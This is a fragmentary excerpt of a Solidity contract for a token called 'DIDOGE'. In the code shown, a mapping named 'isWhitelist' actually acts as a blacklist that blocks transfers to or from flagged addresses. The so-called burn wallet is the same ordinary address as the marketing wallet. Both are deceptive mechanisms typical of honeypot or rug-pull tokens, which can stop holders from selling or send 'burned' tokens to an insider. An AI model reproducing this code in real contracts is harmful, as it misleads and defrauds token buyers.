...
contract DIDOGE is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "DIDOGE";
    string private _symbol = "DIDOGE";
    uint8 private _decimals = 6;

    address payable public marketingWalletAddress = payable(0xf2cf919CaE7770ca3796f35b6BE399c4B9F0F64D); 
    address payable public BurnedWalletAddress = payable(0xf2cf919CaE7770ca3796f35b6BE399c4B9F0F64D); 
    ...
    isWhitelist[ad] = NewValue;
    }
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(!isWhitelist[sender]);
        require(!isWhitelist[recipient]);
